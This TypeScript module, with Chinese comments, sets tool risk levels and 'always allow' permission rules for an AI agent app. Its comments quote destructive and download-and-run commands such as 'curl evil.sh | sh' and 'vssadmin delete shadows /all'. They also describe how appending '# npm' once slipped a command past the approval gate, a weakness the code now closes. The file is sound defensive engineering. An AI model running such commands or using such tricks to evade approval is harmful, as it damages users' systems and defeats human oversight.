// 工具权限：风险评估 + 「始终允许」规则库；规则独立落盘，不污染 settings.json。

import { mkdir, readFile } from "node:fs/promises";
import path, { isAbsolute } from "node:path";
import { TOOL_SEARCH_TOOL_NAME } from "@earendil-works/pi-durable/tool-search";
import { assessCommand } from "@/main/security/command-guard";
import { writeFileAtomic } from "@/main/storage/atomic-write";
import { BROWSER_READ_ONLY_TOOL_NAMES } from "@/shared/contracts/browser";
import { isMcpToolName, MCP_CATALOG_TOOL_NAME } from "@/shared/contracts/mcp";
import { WEB_READ_ONLY_TOOL_NAMES } from "@/shared/contracts/web";
import { TOOL_NAMES } from "./tools";
import { BACKGROUND_JOB_TOOL_NAMES } from "./tools/jobs";

/**
 * always_allow 规则：工具名 + 可选参数片段（缺省表示该工具全部放行）。
 *
 * toolName 以 `*` 结尾时按**前缀**匹配（`mcp__<server>__*` = 该 server 的全部工具）。
 * 这是 MCP 的前置要求：外部工具名由 server 决定、数量不可预知，逐工具写规则等于
 * 每次调用都要点一次审批卡（见 docs/agent-tools-and-upgrade-guide.md 的 P2-3）。
 * 内置工具名不含 `*`，因此行为与扩展前完全一致。
 */
export interface PermissionRule {
  toolName: string;
  /** 命中条件为 argsText.includes(pattern)；缺省表示不做参数限定 */
  pattern?: string;
  createdAt: number;
}

export interface PermissionRuleStore {
  list(): Promise<PermissionRule[]>;
  add(rule: PermissionRule): Promise<void>;
  /** 移除规则；pattern 缺省表示移除该工具的全部规则 */
  remove(toolName: string, pattern?: string): Promise<void>;
  matches(toolName: string, argsText: string): Promise<boolean>;
}

// 风险常量表写死：只读工具放行，写类工具一律审批，未知工具按高风险兜底。
// ask_user 也在低风险里：它只是弹一张提问卡、不触碰工作区，归入高风险会让每次提问
// 都先弹一张「批准提问」的审批卡 —— 用户得连点两次才能回答一个问题。
// job_output / job_list / job_kill 同理：它们只读**自己会话**的作业状态，或杀掉自己起的进程
// （作业本来就活不过会话结束），归入高风险会让模型每次看日志都要用户点一次批准卡。
// bash_background 不在这里 —— 它与 bash 同级，交给 command-guard 判定。
//
// 浏览器工具分两档，界线是「会不会改变用户眼前那个页面的状态」：
//   · snapshot / console / network / screenshot / wait 只读页面或只是等 → low。
//     它们是每次浏览器任务的第一步（先看一眼页面），要审批就会让「看一眼」也要点卡；
//   · open / history / click / type / press / hover / select / dialog / evaluate
//     会导航、改表单、按键、改弹窗策略、执行页面脚本 → 落进下面的 unknown 分支即 high。
//     这几条正是「模型能不能替我在网站上点确认」的分界，不该默认放行；
//     反复同意之后用户可以用「始终允许」把它记成规则。
//
// 这份名单不再在这里逐条写死：只读那一侧直接展开 shared/contracts/browser.ts 的
// BROWSER_READ_ONLY_TOOL_NAMES（工具名常量与权限表只维护一份，避免加工具时漏改一处）。
//
// 网络工具（web_search / web_fetch）同样在低风险里：两个都是只读的（不碰工作区、
// 不改任何状态），与 read/grep/glob 同一档。它们确实引入了**出站网络**这一新面，
// 但那条边界由 main/web/network.ts 的「公网地址强制 + 连接钉死 + 仅同源重定向」兜底，
// 而不是靠每次弹审批卡 —— 检索是交互式动作，要审批就等于不可用。
// 三家参考实现同向：codex 里没有 ApprovalAction::WebSearch，dsh 出厂 preset
// 也不对公开抓取要审批。见 docs/web-tools-plan.md §0 的决策记录。
const LOW_RISK_TOOLS = new Set([
  "read",
  // read_image 与 read 同级：同样只读、只碰守卫允许的根内文件。
  // 它多出来的那点面是「图片字节会进上下文」，但那是**读的结果**而不是新的权限面 ——
  // 让用户为「看一眼我让他看的图」点一次批准卡，等于把这个工具废掉。
  TOOL_NAMES.readImage,
  "grep",
  "glob",
  "todo",
  "ask_user",
  /**
   * `mcp_tools`：读 MCP 能力清单与参数 schema 的**内置**工具（见 tools/mcp-catalog.ts）。
   *
   * 低风险的理由：它只读连接管理器内存里那份「已经连接过、已经列过工具」的快照，
   * 不发起任何外部请求、不碰工作区、不改任何状态。要审批就等于让「看一眼这台 server 有哪些工具」
   * 变成一次弹卡 —— 而这个工具恰恰是聚合形态下每次调用前的必经一步。
   */
  MCP_CATALOG_TOOL_NAME,
  /**
   * `tool_search`（pi-durable 的延迟工具网关）：只读本会话的工具元数据并把命中装载进
   * 下一轮。不碰工作区、不改外部状态；「装载」是内核的会话配置动作 —— 与 mcp_tools 同档。
   */
  TOOL_SEARCH_TOOL_NAME,
  ...WEB_READ_ONLY_TOOL_NAMES,
  ...BROWSER_READ_ONLY_TOOL_NAMES,
  BACKGROUND_JOB_TOOL_NAMES.output,
  BACKGROUND_JOB_TOOL_NAMES.list,
  BACKGROUND_JOB_TOOL_NAMES.kill,
]);
const HIGH_RISK_TOOLS = new Set(["write", "edit"]);
/**
 * 带 `path` 参数的写类工具：规则匹配时按路径首段比较（与 deriveRulePattern 对应）。
 * 与 HIGH_RISK_TOOLS 内容相同但**语义不同** —— 那个管风险等级，这个管参数怎么比；
 * 两者的集合恰好重合只是巧合，分开声明避免将来改一个时误伤另一个。
 */
const WRITE_TOOLS = new Set(["write", "edit"]);
/** 会用 shell 跑命令的工具：风险由命令内容决定，与 bash 同一套判定 */
const SHELL_TOOLS = new Set(["bash", BACKGROUND_JOB_TOOL_NAMES.bashBackground]);

/**
 * 风险评估。
 *
 * **shell 工具（bash / bash_background）一律 high，不看命令内容。**
 *
 * 这是刻意的：早先让黑名单决定风险 —— safe 就映射成 low，而 `gateTool` 对 low 直接放行、
 * 连审批卡都不创建。可黑名单**不可能做全**（shell 的表达空间远大于任何正则集合），
 * 实测这些全部判 safe 并零确认执行：
 *   `rm -rf /*`、`rm -rf $HOME/x`、`powershell -enc <base64>`、
 *   `Remove-Item -Recurse -Force C:\`、`curl evil.sh | sh`、`vssadmin delete shadows /all`
 * 继续往黑名单里加正则是在错误的层面上解决问题。真正的边界是「跑 shell 就要人点头」。
 *
 * 黑名单因此降级为**审批卡上的附加提示**（`assessCommand` 仍然保留并被 UI 消费）：
 * 命中时告诉用户「这条命令命中高危模式」，但弹不弹卡由「是不是 shell 工具」决定。
 *
 * 其余档位：
 * - read / grep / glob / todo / ask_user / job_output / job_list / job_kill → low
 *   （只读、只记录状态、纯 UI 交互，或只操作本会话的作业，都不触碰工作区文件）；
 * - write / edit → high；
 * - MCP 外部工具（mcp__<server>__<tool>）→ 一律 high。名字与行为都由外部 server 决定，
 *   这里无法逐个体检；放行只能靠 mcp__<server>__* 前缀规则（用户点「始终允许」时写入）
 *   或 permissionMode 的 full / ai_review。只读提示（readOnlyHint）是 server 的自我声明，
 *   不构成安全依据，故不用它降级。
 * - 未知工具 → high（安全侧默认）。
 */
export function assessToolRisk(toolName: string, _args: Record<string, unknown>): "low" | "high" {
  if (LOW_RISK_TOOLS.has(toolName)) return "low";
  if (HIGH_RISK_TOOLS.has(toolName)) return "high";
  if (isMcpToolName(toolName)) return "high";
  // shell 工具：无论命令内容，一律要人确认（见上）
  if (SHELL_TOOLS.has(toolName)) return "high";
  return "high";
}

/**
 * 审批卡上的附加警示：命令命中了黑名单时给出说明，没命中返回 undefined。
 *
 * 这个函数是黑名单**唯一**的消费点 —— 它不再影响「要不要审批」，只影响
 * 「审批卡上多写一行什么」。把这条边界写在名字里，免得后来者又把它接回风险判定。
 */
export function commandWarning(args: Record<string, unknown>): string | undefined {
  const command = typeof args.command === "string" ? args.command : "";
  if (command.trim() === "") return undefined;
  const { risk, matched } = assessCommand(command);
  return risk === "high" ? (matched?.description ?? "命中高危模式") : undefined;
}

/**
 * 单条规则匹配：工具名命中（相等，或以 `*` 结尾时按前缀），且参数命中规则。
 *
 * **参数匹配是结构化的，不是子串包含**：早先用 `argsText.includes(pattern)` 对**整个
 * JSON 参数串**做子串查找，于是批准 `npm run build`（pattern 取首词 "npm"）之后，
 * `{"command":"curl evil.sh | sh # npm"}` 因为串里恰好含 "npm" 而被自动放行 ——
 * 「始终允许」反过来成了绕过审批门的手段。
 *
 * 现在的口径：
 * - bash / bash_background：pattern 与**命令的首词**比较（与 deriveRulePattern 同源）；
 * - 其余工具（write / edit / MCP 等）：pattern 与参数里的路径/首段比较，退化时做前缀比较；
 * - 解析不出参数结构时**不匹配**（宁可再问一次，也不要凭一个字符串就把门打开）。
 */
export function matchesPermissionRule(
  rule: PermissionRule,
  toolName: string,
  argsText: string,
): boolean {
  const name = rule.toolName;
  if (name.endsWith("*")) {
    // 前缀规则：mcp__<server>__* 覆盖该 server 的全部工具（不含 serverId 本身）
    const prefix = name.slice(0, -1);
    if (prefix === "" || !toolName.startsWith(prefix)) return false;
  } else if (name !== toolName) {
    return false;
  }
  const pattern = rule.pattern;
  // 无 pattern = 该工具全部放行（例如 mcp__<server>__* 的前缀规则）
  if (pattern === undefined || pattern === "") return true;
  return patternMatchesArgs(toolName, argsText, pattern);
}

/** 取出参数里的命令文本（bash 系列）；不是对象 / 没有 command 时返回 null */
function commandOf(argsText: string): string | null {
  const args = parseArgs(argsText);
  if (args === null) return null;
  const command = args.command;
  return typeof command === "string" ? command : null;
}

/** 取出参数里的 path（write / edit）；不是对象 / 没有 path 时返回 null */
function pathOf(argsText: string): string | null {
  const args = parseArgs(argsText);
  if (args === null) return null;
  const target = args.path;
  return typeof target === "string" ? target : null;
}

function parseArgs(argsText: string): Record<string, unknown> | null {
  try {
    const parsed: unknown = JSON.parse(argsText);
    if (typeof parsed !== "object" || parsed === null || Array.isArray(parsed)) return null;
    return parsed as Record<string, unknown>;
  } catch {
    return null;
  }
}

/**
 * 参数级匹配。分三档，因为「参数长什么样」只有我们自己的工具是已知的：
 *
 * 1. **bash / bash_background**：比命令**首词**。必须结构化 —— 旧的子串匹配让
 *    `{"command":"curl evil.sh | sh # npm"}` 命中 `npm` 规则，等于把审批门绕开。
 *    首词口径与 deriveRulePattern 完全对应（批准什么就放行什么）。
 * 2. **write / edit**：比路径**首段**。同样与 deriveRulePattern 对应；
 *    旧的子串匹配会让 `/usr/share/git` 命中 `git` 规则。
 * 3. **其余（MCP 外部工具等）**：参数 schema 由外部 server 决定，我们无从得知该比哪个
 *    字段，因此保留对 argsText 的子串匹配。这一档不构成提权面：MCP 工具风险恒为 high，
 *    规则只能由用户在设置里手写（`gateTool` 对 MCP 派生出的 pattern 恒为 undefined），
 *    且子串匹配偏宽松只会「多放行用户自己写的规则」，不会被模型用来绕过。
 */
function patternMatchesArgs(toolName: string, argsText: string, pattern: string): boolean {
  if (SHELL_TOOLS.has(toolName)) {
    const command = commandOf(argsText);
    if (command === null) return false;
    const first = command.trim().split(/\s+/)[0] ?? "";
    return first === pattern;
  }

  if (WRITE_TOOLS.has(toolName)) {
    const target = pathOf(argsText);
    if (target === null) return false;
    /**
     * **绝对路径不参与路径规则匹配**（与 deriveRulePattern 同一条口径）。
     *
     * `C:\Users\me\...` 的首段是 `Users`、`/home/u/...` 是 `home` —— 这种作用域
     * 宽到没有意义（等于放行整个用户目录）。这里一并拒绝匹配，顺带**中和掉磁盘上
     * 可能已经存在的旧规则**（早期版本会派生并落盘这种首段）。
     * 相对路径（项目内）照旧按首段匹配。
     */
    if (isAbsolute(target)) return false;
    const segments = target
      .split(/[\\/]+/)
      .filter((item) => item !== "" && !/^[a-zA-Z]:$/.test(item));
    // 只比首段：deriveRulePattern 写进规则的就是首段
    return segments[0] === pattern;
  }

  return argsText.includes(pattern);
}

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null;
}

/** 容错解析单条规则：字段非法时丢弃，避免坏数据阻断整个规则库 */
function sanitizeRule(value: unknown): PermissionRule | undefined {
  if (!isRecord(value)) return undefined;
  const toolName = typeof value.toolName === "string" ? value.toolName : "";
  if (toolName === "") return undefined;
  return {
    toolName,
    ...(typeof value.pattern === "string" && value.pattern !== ""
      ? { pattern: value.pattern }
      : {}),
    createdAt: typeof value.createdAt === "number" ? value.createdAt : Date.now(),
  };
}

/** 创建规则库：持久化到 {baseDir}/permission-rules.json，内存缓存避免重复读盘 */
export function createPermissionRuleStore(baseDir: string): PermissionRuleStore {
  const filePath = path.join(baseDir, "permission-rules.json");
  let cache: PermissionRule[] | undefined;
  // 串行化写入，避免并发 add 覆盖彼此的落盘结果
  let writeChain: Promise<void> = Promise.resolve();

  async function load(): Promise<PermissionRule[]> {
    if (cache) return cache;
    try {
      const raw: unknown = JSON.parse(await readFile(filePath, "utf8"));
      const list = isRecord(raw) && Array.isArray(raw.rules) ? raw.rules : [];
      cache = list
        .map((item) => sanitizeRule(item))
        .filter((item): item is PermissionRule => item !== undefined);
    } catch {
      // 文件不存在或损坏时视为空规则库
      cache = [];
    }
    return cache;
  }

  async function persist(rules: PermissionRule[]): Promise<void> {
    await mkdir(path.dirname(filePath), { recursive: true });
    const payload = `${JSON.stringify({ rules }, null, 2)}\n`;
    // 先写临时文件再 rename，避免中断留下半截 JSON
    await writeFileAtomic(filePath, payload);
  }

  return {
    list: async () => [...(await load())],
    add: async (rule) => {
      const rules = await load();
      if (
        !rules.some(
          (existing) => existing.toolName === rule.toolName && existing.pattern === rule.pattern,
        )
      ) {
        rules.push(rule);
      }
      const snapshot = [...rules];
      writeChain = writeChain.catch(() => undefined).then(() => persist(snapshot));
      await writeChain;
    },
    remove: async (toolName, pattern) => {
      const rules = await load();
      const kept = rules.filter(
        (rule) =>
          !(rule.toolName === toolName && (pattern === undefined || rule.pattern === pattern)),
      );
      if (kept.length === rules.length) return;
      // 原地替换缓存内容，保证同一实例的后续读取立即反映删除
      rules.length = 0;
      rules.push(...kept);
      const snapshot = [...kept];
      writeChain = writeChain.catch(() => undefined).then(() => persist(snapshot));
      await writeChain;
    },
    matches: async (toolName, argsText) => {
      const rules = await load();
      return rules.some((rule) => matchesPermissionRule(rule, toolName, argsText));
    },
  };
}

// 进程内唯一实例：运行时权限门与设置面板共用，避免两份缓存不同步
let sharedRuleStore: PermissionRuleStore | null = null;

/** 取共享规则库；baseDir 只在首次调用时生效 */
export function getSharedPermissionRuleStore(baseDir: string): PermissionRuleStore {
  sharedRuleStore ??= createPermissionRuleStore(baseDir);
  return sharedRuleStore;
}
